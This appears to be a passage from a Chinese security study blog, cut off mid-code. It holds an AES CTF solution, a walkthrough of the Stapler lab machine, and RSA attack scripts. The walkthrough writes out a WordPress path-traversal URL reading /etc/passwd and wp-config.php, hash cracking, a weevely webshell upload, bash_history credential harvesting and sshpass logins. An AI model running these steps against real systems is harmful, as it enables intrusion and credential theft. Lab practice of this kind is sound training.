<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Cryptodome.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> FLAG</span><br><span class="line"><span class="keyword">from</span> Cryptodome.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    key=os.urandom(<span class="number">2</span>)*<span class="number">16</span></span><br><span class="line">    iv=os.urandom(<span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(bytes_to_long(key)^bytes_to_long(iv))</span><br><span class="line">    aes=AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">    enc_flag = aes.encrypt(FLAG)</span><br><span class="line">    <span class="built_in">print</span>(enc_flag)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"><span class="comment"># 91144196586662942563895769614300232343026691029427747065707381728622849079757</span></span><br><span class="line"><span class="comment"># b&#x27;\x8c-\xcd\xde\xa7\xe9\x7f.b\x8aKs\xf1\xba\xc75\xc4d\x13\x07\xac\xa4&amp;\xd6\x91\xfe\xf3\x14\x10|\xf8p&#x27;</span></span><br></pre></td></tr></table></figure>

<p>先分析一下题目中的几个关键函数和方法：</p>
<p>urandom:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">语法  os.urandom（size）</span><br><span class="line">参数：</span><br><span class="line">	size:字符串随机字节的大小</span><br><span class="line">	返回值：该方法返回一个字符串，该字符串表示适合加密使用的随机字节。</span><br><span class="line">例 os.urandom(1)</span><br><span class="line">输出：b&#x27;\x91&#x27;</span><br><span class="line">二进制：10010001 （8bits）</span><br></pre></td></tr></table></figure>

<p>AES.new(key, mode, *args, **kwargs)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">param key(参数密钥):</span><br><span class="line">在对称密码中使用的秘密密钥。</span><br><span class="line"></span><br><span class="line">它必须为16、24或32个字节长（分别用于AES-128， AES-192或AES-256）。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mode（模式）</span><br><span class="line">模式（支持的MODE_*常量之一）–用于加密或解密的链接模式。</span><br><span class="line">学习链接：https://pycryptodome.readthedocs.io/en/latest/src/cipher/aes.html</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Keyword Arguments（关键字参数）：</span><br><span class="line">IV（字节，字节组，memoryview） - （只适用于MODE_CBC，MODE_CFB，MODE_OFB，和MODE_OPENPGP模式）。</span><br><span class="line"></span><br><span class="line">用于加密或解密的初始化向量。</span><br><span class="line"></span><br><span class="line">对于MODE_CBC，MODE_CFB和MODE_OFB它必须是16个字节。</span><br></pre></td></tr></table></figure>

<p>解题脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#python3</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">xor = <span class="number">91144196586662942563895769614300232343026691029427747065707381728622849079757</span></span><br><span class="line">enc_flag = <span class="string">b&#x27;\x8c-\xcd\xde\xa7\xe9\x7f.b\x8aKs\xf1\xba\xc75\xc4d\x13\x07\xac\xa4&amp;\xd6\x91\xfe\xf3\x14\x10|\xf8p&#x27;</span></span><br><span class="line">out = long_to_bytes(xor)</span><br><span class="line">key = out[:<span class="number">16</span>]*<span class="number">2</span></span><br><span class="line"><span class="comment"># print(key)</span></span><br><span class="line">iv = bytes_to_long(key[<span class="number">16</span>:])^bytes_to_long(out[<span class="number">16</span>:])</span><br><span class="line"><span class="comment"># print(iv)</span></span><br><span class="line">iv = long_to_bytes(iv)</span><br><span class="line"><span class="comment"># print(iv)</span></span><br><span class="line">aes = AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">flag = aes.decrypt(enc_flag)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/chouzhou9701/article/details/122019967">python实现AES加密解密_python aes_Hello_wshuo的博客-CSDN博客</a></p>
<p>下面简单的一个例子ECB模式加密解密 :</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">password = <span class="string">b&#x27;1234567812345678&#x27;</span> <span class="comment">#秘钥，b就是表示为bytes类型</span></span><br><span class="line">text = <span class="string">b&#x27;abcdefghijklmnhi&#x27;</span> <span class="comment">#需要加密的内容，bytes类型</span></span><br><span class="line">aes = AES.new(password,AES.MODE_ECB) <span class="comment">#创建一个aes对象</span></span><br><span class="line"><span class="comment"># AES.MODE_ECB 表示模式是ECB模式</span></span><br><span class="line">en_text = aes.encrypt(text) <span class="comment">#加密明文</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;密文：&quot;</span>,en_text) <span class="comment">#加密明文，bytes类型</span></span><br><span class="line">den_text = aes.decrypt(en_text) <span class="comment"># 解密密文</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;明文：&quot;</span>,den_text)</span><br></pre></td></tr></table></figure>

<p>以上是针对ECB模式的加密解密，从这个例子中可以看出参数中有几个限制。</p>
<ol>
<li>秘钥必须为16字节或者16字节的倍数的字节型数据。</li>
<li>明文必须为16字节或者16字节的倍数的字节型数据，如果不够16字节需要进行补全，关于补全规则，后面会在补全模式中具体介绍。</li>
</ol>
<p>通过CBC模式例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">password = <span class="string">b&#x27;1234567812345678&#x27;</span> <span class="comment">#秘钥，b就是表示为bytes类型</span></span><br><span class="line">iv = <span class="string">b&#x27;1234567812345678&#x27;</span> <span class="comment"># iv偏移量，bytes类型</span></span><br><span class="line">text = <span class="string">b&#x27;abcdefghijklmnhi&#x27;</span> <span class="comment">#需要加密的内容，bytes类型</span></span><br><span class="line">aes = AES.new(password,AES.MODE_CBC,iv) <span class="comment">#创建一个aes对象</span></span><br><span class="line"><span class="comment"># AES.MODE_CBC 表示模式是CBC模式</span></span><br><span class="line">en_text = aes.encrypt(text) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;密文：&quot;</span>,en_text) <span class="comment">#加密明文，bytes类型</span></span><br><span class="line">aes = AES.new(password,AES.MODE_CBC,iv) <span class="comment">#CBC模式下解密需要重新创建一个aes对象</span></span><br><span class="line">den_text = aes.decrypt(en_text)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;明文：&quot;</span>,den_text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<ol>
<li><strong>在Python中进行AES加密解密时，所传入的密文、明文、秘钥、iv偏移量、都需要是bytes（字节型）数据。python 在构建aes对象时也只能接受bytes类型数据。</strong></li>
</ol>
<p><strong>2.当秘钥，iv偏移量，待加密的明文，字节长度不够16字节或者16字节倍数的时候需要进行补全。</strong></p>
<ol start="3">
<li><p><strong>CBC模式需要重新生成AES对象，为了防止这类错误，我写代码无论是什么模式都重新生成AES对象。</strong></p>
</li>
<li><p>编码模式<br>前面说了，python中的 AES 加密解密，只能接受字节型(bytes)数据。而我们常见的 待加密的明文可能是中文，或者待解密的密文经过base64编码的，这种都需要先进行编码或者解码，然后才能用AES进行加密或解密。反正无论是什么情况，在python使用AES进行加密或者解密时，都需要先转换成bytes型数据。</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">password = <span class="string">b&#x27;1234567812345678&#x27;</span> <span class="comment">#秘钥，b就是表示为bytes类型</span></span><br><span class="line">text = <span class="string">&quot;好好学习天天向上&quot;</span>.encode(<span class="string">&#x27;gbk&#x27;</span>) <span class="comment">#gbk编码，是1个中文字符对应2个字节，8个中文正好16字节</span></span><br><span class="line">aes = AES.new(password,AES.MODE_ECB) <span class="comment">#创建一个aes对象</span></span><br><span class="line"><span class="comment"># AES.MODE_ECB 表示模式是ECB模式</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(text))</span><br><span class="line">en_text = aes.encrypt(text) <span class="comment">#加密明文</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;密文：&quot;</span>,en_text) <span class="comment">#加密明文，bytes类型</span></span><br><span class="line">den_text = aes.decrypt(en_text) <span class="comment"># 解密密文</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;明文：&quot;</span>,den_text.decode(<span class="string">&quot;gbk&quot;</span>)) <span class="comment"># 解密后同样需要进行解码</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>对于中文明文，我们可以使用encode()函数进行编码，将字符串转换成bytes类型数据，而这里我选择gbk编码，是为了正好能满足16字节，utf8编码是一个中文字符对应3个字节。这里为了举例所以才选择使用gbk编码。</p>
<p>在解密后，同样是需要decode()函数进行解码的，将字节型数据转换回中文字符（字符串类型）。</p>
]]></content>
  </entry>
  <entry>
    <title>oscp3</title>
    <url>/2023/09/15/oscp3/</url>
    <content><![CDATA[<p><img src="https://s3.bmp.ovh/imgs/2023/09/15/820f0a08f3a76274.png"></p>
<span id="more"></span>

<h2 id="stapler"><a href="#stapler" class="headerlink" title="stapler"></a>stapler</h2><p>信息搜集</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap 192.168.56.0/24 -sn </span><br></pre></td></tr></table></figure>

<p>端口扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap 192.168.56.114 -p- -sV -A</span><br></pre></td></tr></table></figure>

<p><img src="https://s3.bmp.ovh/imgs/2023/09/15/f143bc0aa97faa2b.png"></p>
<p>有ftp 服务</p>
<p>尝试匿名登录 ，里面有个文件如下</p>
<p>Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.</p>
<p>发现用户 john</p>
<p>smb 连接 发现其他 </p>
<p>使用 nikto 扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nikto -h 192.168.56.114 -p 12380</span><br></pre></td></tr></table></figure>

<p>扫描出来</p>
<p>&#x2F;blogblog&#x2F;</p>
<p>&#x2F;phpmyadmin</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpscan --url https://192.168.56.114:12380/blogblog/ --disable-tls-checks</span><br></pre></td></tr></table></figure>

<p>–disable-tls-checks #禁用SSL&#x2F;TLS证书验证</p>
<p>然后发现一些目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://192.168.56.114:12380/blogblog/wp-content/</span><br></pre></td></tr></table></figure>

<p>存在wordpress 插件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit advanced video</span><br><span class="line">searchsploit -m exploits/php/webapps /39646.py</span><br></pre></td></tr></table></figure>

<p>分析这个exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://192.168.56.114:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&amp;title=random&amp;short=1&amp;term=1&amp;thumb=../../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>

<p>然后跳转给的网页，</p>
<p>最后访问 即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://192.168.56.114:12380/blogblog/wp-content/uploads/</span><br></pre></td></tr></table></figure>

<p>然后发现图片 kali 下载图片，发现文件泄露</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget --no-check-certificate https://192.168.56.114:12380/blogblog/wp-content/uploads/1618478195.jpeg</span><br></pre></td></tr></table></figure>

<p>然后尝试读配置文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://192.168.56.114:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&amp;title=random&amp;short=1&amp;term=1&amp;thumb=../wp-config.php</span><br></pre></td></tr></table></figure>

<p>下载图片</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget --no-check-certificate https://192.168.56.114:12380/blogblog/wp-content/uploads/2128093671.jpeg</span><br></pre></td></tr></table></figure>

<p>得到数据库的用户名密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/** MySQL database username */</span><br><span class="line">define(&#x27;DB_USER&#x27;, &#x27;root&#x27;);</span><br><span class="line">/** MySQL database password */</span><br><span class="line">define(&#x27;DB_PASSWORD&#x27;, &#x27;plbkac&#x27;);</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -h 192.168.56.114 -u root -p</span><br></pre></td></tr></table></figure>

<p>发现后台账号密码，进行解密</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$P$B7889EMq/erHIuZapMB8GEizebcIy9.</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john 1.txt --wordlist=/usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>

<p>成功登录后台</p>
<p>在插件处存在文件上传漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">weevely generate 1 /home/zhou/桌面/1.php</span><br><span class="line">weevely https://192.168.56.114:12380/blogblog/wp-content/uploads/3.php  &#x27;1&#x27;</span><br></pre></td></tr></table></figure>

<p>上传一个菜刀马子</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /home</span><br><span class="line">cat */.bash_history //查看命令执行记录</span><br><span class="line">sshpass -p thisimypassword ssh JKanode@localhost</span><br><span class="line">apt-get install sshpass</span><br><span class="line">sshpass -p JZQuyIN5 peter@localhost</span><br></pre></td></tr></table></figure>

<p>登录peter，然后sudo 直接提权</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/09/23/431038437d674bd4.png"></p>
<p>查看系统版本</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/09/23/e0905a5a4ba108f5.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure>

<p>内核提权没提出来</p>
]]></content>
  </entry>
  <entry>
    <title>rsa</title>
    <url>/2023/03/06/rsa/</url>
    <content><![CDATA[<p> rsa<br> <span id="more"></span></p>
<h1 id="RSA介绍"><a href="#RSA介绍" class="headerlink" title="RSA介绍"></a>RSA介绍</h1><p>欧拉定理</p>
<p>若n为素数φ(n)&#x3D;n-1;</p>
<p>e与φ(n)互质    公钥e,n 私钥d,n</p>
<p>M为明文，C为密文；</p>
<p>M^e mod n&#x3D;C</p>
<p>C^d mod n &#x3D;M</p>
<p>ed&#x3D;1(modφ(n))</p>
<p>d为模反元素计算公式，d&#x3D;gmpy2.invert(e,(p-1)*(q-1))</p>
<p><code>n=p*q  ，φ(n)=(p-1)*(q-1)</code></p>
<p>已知dp，dq，p，q，c</p>
<blockquote>
<p>dp&#x3D;d%(p-1)</p>
<p>dq&#x3D;d%(q-1)</p>
</blockquote>
<p><a href="https://blog.csdn.net/huanghelouzi/article/details/82943615?ops_request_misc=&request_id=&biz_id=102&utm_term=ctf%20rsa&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-8-82943615.142%5Ev70%5Eone_line,201%5Ev4%5Eadd_ask&spm=1018.2226.3001.4187">rsa解密详解以及脚本</a>.<br><a href="https://blog.csdn.net/vhkjhwbs/article/details/101160822?ops_request_misc=&request_id=&biz_id=102&utm_term=ctf%20rsa&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-9-101160822.142%5Ev70%5Eone_line,201%5Ev4%5Eadd_ask&spm=1018.2226.3001.4187">rsa解密详解以及脚本</a>;</p>
<h2 id="gmpy2常见函数使用"><a href="#gmpy2常见函数使用" class="headerlink" title="gmpy2常见函数使用"></a>gmpy2常见函数使用</h2><p><strong>1.初始化大整数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">gmpy2.mpz(909090)</span><br><span class="line">result:mpz(909090)</span><br></pre></td></tr></table></figure>

<p><strong>2.求大整数a,b的最大公因数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">gmpy2.gcd(6,18)</span><br><span class="line">result:mpz(6)</span><br></pre></td></tr></table></figure>

<p><strong>3.求大整数x模m的逆元y</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">#4*6 ≡ 1 mod 23</span><br><span class="line">gmpy2.invert(4,23)</span><br><span class="line">result:mpz(6)</span><br></pre></td></tr></table></figure>

<p><strong>4.检验大整数是否为偶数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">gmpy2.is_even(6)</span><br><span class="line">result:True</span><br><span class="line">import gmpy2</span><br><span class="line">gmpy2.is_even(7)</span><br><span class="line">result:False</span><br></pre></td></tr></table></figure>

<p><strong>5.检验大整数是否为奇数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">gmpy2.is_odd(6)</span><br><span class="line">result:False</span><br><span class="line">import gmpy2</span><br><span class="line">gmpy2.is_odd(7)</span><br><span class="line">result:True</span><br></pre></td></tr></table></figure>

<p><strong>6.检验大整数是否为素数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">gmpy2.is_prime(5)</span><br><span class="line">result:True</span><br></pre></td></tr></table></figure>

<p><strong>7.求大整数x开n次根</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">gmpy2.iroot(81,2)</span><br><span class="line">result:(mpz(9),True)</span><br></pre></td></tr></table></figure>

<p><strong>8.求大整数x的y次幂模m取余</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">#2^4 mod 5 </span><br><span class="line">gmpy2.powmod(2,4,15)</span><br><span class="line">result:mpz(1)</span><br></pre></td></tr></table></figure>

<p>libnum库<br>十进制转字符串 libnum.n2s(j)</p>
<h2 id><a href="#" class="headerlink" title></a></h2><h2 id="已知-p-q-e-c-，求m。"><a href="#已知-p-q-e-c-，求m。" class="headerlink" title="已知(p, q, e,c)，求m。"></a>已知(p, q, e,c)，求m。</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import libnum</span><br><span class="line">p=447685307</span><br><span class="line">q=2037</span><br><span class="line">e=17</span><br><span class="line">c=704796792</span><br><span class="line">phi = (p-1)*(q-1)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = gmpy2.powmod(c,d,p*q)</span><br><span class="line">print(libnum.n2s(m))</span><br></pre></td></tr></table></figure>

<h1 id="模数pq相关攻击"><a href="#模数pq相关攻击" class="headerlink" title="模数pq相关攻击"></a>模数pq相关攻击</h1><p>在 N 的比特位数小于 512 的时候，可以采用大整数分解的策略获取 p 和 q。</p>
<h2 id="已知p-q-dp-dq-c"><a href="#已知p-q-dp-dq-c" class="headerlink" title="已知p,q,dp,dq,c"></a>已知p,q,dp,dq,c</h2><p>buu RSA1</p>
<p>所需要求的值：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229 </span><br><span class="line">q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469 </span><br><span class="line">dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929 </span><br><span class="line">dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041 </span><br><span class="line">c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span><br></pre></td></tr></table></figure>

<p>(1)计算q逆模q1;<br>(2)计算m1为c的dp次方再对p求模<br>(3)计算m2为c的dq次方再对q求模<br>(4)m &#x3D; ((((m2 - m1) * p1) % q) * p + m2) % n;</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">p = </span><br><span class="line">q = </span><br><span class="line">dp = </span><br><span class="line">dq = </span><br><span class="line">c = </span><br><span class="line">n = p * q</span><br><span class="line">m1 = <span class="built_in">pow</span>(c, dp, p)</span><br><span class="line">m2 = <span class="built_in">pow</span>(c, dq, q)</span><br><span class="line">p1 = gmpy2.invert(q, p)</span><br><span class="line">m = ((((m2 - m1) * p1) % q) * p + m2) % n</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(m))</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/MikeCoke/article/details/105967809">(4条消息) BUUCTF RSA题目全解1_buuctf rsa1_宁嘉的博客-CSDN博客</a></p>
<h2 id="已知-e-dp-n-c-，求m"><a href="#已知-e-dp-n-c-，求m" class="headerlink" title="已知(e,dp, n, c)，求m"></a>已知(e,dp, n, c)，求m</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import binascii</span><br><span class="line">e = 65537</span><br><span class="line">n = 248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113</span><br><span class="line">dp = 905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657</span><br><span class="line"></span><br><span class="line">c = 140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751</span><br><span class="line"></span><br><span class="line">for i in range(1,e):</span><br><span class="line">    if (e*dp-1)%i == 0 and n%((e*dp-1)//i+1)==0:</span><br><span class="line">        q = n//((e*dp-1)//i+1)</span><br><span class="line">        phi = (q-1)*((e*dp-1)//i)</span><br><span class="line">        d = gmpy2.invert(e,phi)</span><br><span class="line">        m = gmpy2.powmod(c,d,n)</span><br><span class="line"></span><br><span class="line">print(binascii.unhexlify(hex(m)[2:]))</span><br></pre></td></tr></table></figure>





<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c1=22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361</span><br><span class="line">n=22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801</span><br><span class="line">e1=11187289</span><br><span class="line">c2=18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397</span><br><span class="line">e2=9647291</span><br></pre></td></tr></table></figure>

<h2 id="共模攻击-n-e1-e2-c1-c2-求m。"><a href="#共模攻击-n-e1-e2-c1-c2-求m。" class="headerlink" title="共模攻击(n, e1, e2,c1,c2)求m。"></a>共模攻击(n, e1, e2,c1,c2)求m。</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import binascii</span><br><span class="line"></span><br><span class="line">n = </span><br><span class="line">c1 = </span><br><span class="line">c2 = </span><br><span class="line">e1 = 11187289</span><br><span class="line">e2 = 9647291</span><br><span class="line"></span><br><span class="line">s = gmpy2.gcdext(e1,e2)</span><br><span class="line">a = s[1]</span><br><span class="line">b = s[2]</span><br><span class="line"></span><br><span class="line">if a&lt;0:</span><br><span class="line">    a = -a</span><br><span class="line">    c1 = gmpy2.invert(c1,n)</span><br><span class="line">else:</span><br><span class="line">    b = -b</span><br><span class="line">    c2 = gmpy2.invert(c2,n)</span><br><span class="line"></span><br><span class="line">m = (gmpy2.powmod(c1,a,n)*gmpy2.powmod(c2,b,n))%n</span><br><span class="line"></span><br><span class="line">print(binascii.unhexlify(hex(m)[2:]))</span><br></pre></td></tr></table></figure>

<h2 id="已知-e-n1-c1-n2-c2-，求m。"><a href="#已知-e-n1-c1-n2-c2-，求m。" class="headerlink" title="已知( e,n1,c1,n2,c2)，求m。"></a>已知( e,n1,c1,n2,c2)，求m。</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import binascii</span><br><span class="line"></span><br><span class="line">e = 65537</span><br><span class="line">n1 = </span><br><span class="line">c1 = </span><br><span class="line"></span><br><span class="line">n2 = </span><br><span class="line">c2 = </span><br><span class="line"></span><br><span class="line">p = gmpy2.gcd(n1,n2)</span><br><span class="line">q = n1 // p</span><br><span class="line">phi = (p-1)*(q-1)</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = gmpy2.powmod(c1,d,n1)</span><br><span class="line"></span><br><span class="line">print(binascii.unhexlify(hex(m)[2:]))</span><br></pre></td></tr></table></figure>

<h2 id="已知-p-q-p-q-e-c-，求m。"><a href="#已知-p-q-p-q-e-c-，求m。" class="headerlink" title="已知(p+q,p-q, e,c)，求m。"></a>已知(p+q,p-q, e,c)，求m。</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import libnum</span><br><span class="line">e=16300321</span><br><span class="line"></span><br><span class="line">a=</span><br><span class="line"></span><br><span class="line">b=</span><br><span class="line"></span><br><span class="line">c=</span><br><span class="line"></span><br><span class="line">p = (a+b)//2</span><br><span class="line">q = (a-b)//2</span><br><span class="line"></span><br><span class="line">phi = (p-1)*(q-1)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line"></span><br><span class="line">m = gmpy2.powmod(c,d,p*q)</span><br><span class="line">print(libnum.n2s(m))</span><br></pre></td></tr></table></figure>

<h2 id="模不互素"><a href="#模不互素" class="headerlink" title="模不互素"></a>模不互素</h2><p>当存在两个公钥的 N 不互素时，我们显然可以直接对这两个数求最大公因数，然后直接获得 p，q，进而获得相应的私钥。</p>
<h2 id="P高位泄露"><a href="#P高位泄露" class="headerlink" title="P高位泄露"></a>P高位泄露</h2><h3 id="CISCN-2021初赛-rsa"><a href="#CISCN-2021初赛-rsa" class="headerlink" title="[CISCN 2021初赛]rsa"></a>[CISCN 2021初赛]rsa</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> text,flag</span><br><span class="line"><span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes,bytes_to_long,getPrime</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> md5.new(text).hexdigest() == flag[<span class="number">6</span>:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">msg1 = text[:xx]</span><br><span class="line">msg2 = text[xx:yy]</span><br><span class="line">msg3 = text[yy:]</span><br><span class="line"></span><br><span class="line">msg1 = bytes_to_long(msg1)</span><br><span class="line">msg2 = bytes_to_long(msg2)</span><br><span class="line">msg3 = bytes_to_long(msg3)</span><br><span class="line"></span><br><span class="line">p1 = getPrime(<span class="number">512</span>)</span><br><span class="line">q1 = getPrime(<span class="number">512</span>)</span><br><span class="line">N1 = p1*q1</span><br><span class="line">e1 = <span class="number">3</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">pow</span>(msg1,e1,N1)</span><br><span class="line"><span class="built_in">print</span> (e1,N1)//第一部分低加密指数攻击</span><br><span class="line"></span><br><span class="line">p2 = getPrime(<span class="number">512</span>)</span><br><span class="line">q2 = getPrime(<span class="number">512</span>)</span><br><span class="line">N2 = p2*q2</span><br><span class="line">e2 = <span class="number">17</span></span><br><span class="line">e3 = <span class="number">65537</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">pow</span>(msg2,e2,N2)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">pow</span>(msg2,e3,N2)</span><br><span class="line"><span class="built_in">print</span> (e2,N2)</span><br><span class="line"><span class="built_in">print</span> (e3,N2)//共模攻击</span><br><span class="line"></span><br><span class="line">p3 = getPrime(<span 